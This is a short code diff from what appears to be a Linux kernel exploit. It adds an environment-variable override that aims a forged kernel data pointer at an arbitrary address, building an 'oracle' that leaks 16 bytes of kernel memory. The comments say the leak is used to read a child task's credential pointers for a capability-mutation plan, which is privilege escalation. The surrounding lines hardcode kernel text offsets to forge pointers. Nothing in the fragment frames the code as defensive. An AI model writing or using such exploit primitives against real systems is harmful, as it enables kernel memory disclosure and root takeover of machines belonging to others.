@@ -1220,6 +1220,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x27c14b8);
               tree_r = 0;
               tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
+              /* ORACLE TARGET override: aim the boot_id data pointer at an
+               * arbitrary kernel address (P0) — the readback leaks 16 bytes
+               * from there. Used to read [real_cred, cred] of the punched
+               * child (task+0x778) for the cap_effective mutation plan. */
+              {
+                const char *ot = getenv("MODE4_ORACLE_TGT");
+                if (ot && ot[0])
+                  tree_pc = (uint64_t)strtoull(ot, NULL, 0);
+              }
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
